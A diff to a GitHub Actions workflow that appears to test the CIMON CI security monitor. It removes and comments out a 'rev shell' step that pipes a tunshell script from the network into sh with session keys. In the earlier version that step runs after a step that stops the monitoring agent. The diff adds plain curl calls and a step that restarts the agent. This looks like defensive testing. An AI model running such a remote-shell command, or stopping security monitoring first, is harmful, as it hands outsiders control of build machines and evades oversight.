@@ -8,6 +8,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - uses: cycodelabs/cimon-action@v0
+      with: 
 
     - name: Stop CIMON
       shell: bash
@@ -16,7 +17,18 @@ jobs:
         /tmp/cimon/cimon agent stop
         EOF
 
-    - name: rev shell
+#    - name: rev shell
+#      shell: bash
+#      run: |
+#        curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T wNC2LHG4Fwl9qmTNTbywmI tSlxaQDhwsFfjaz54WqFIP eu.relay.tunshell.com
+
+    - name: Random curl 
       shell: bash
       run: |
-        curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T wNC2LHG4Fwl9qmTNTbywmI tSlxaQDhwsFfjaz54WqFIP eu.relay.tunshell.com
+        curl google.com
+        curl example.com
+
+    - name: Restart CIMON 
+      shell: bash
+      run: |
+        sudo -E /tmp/cimon/cimon agent start-background
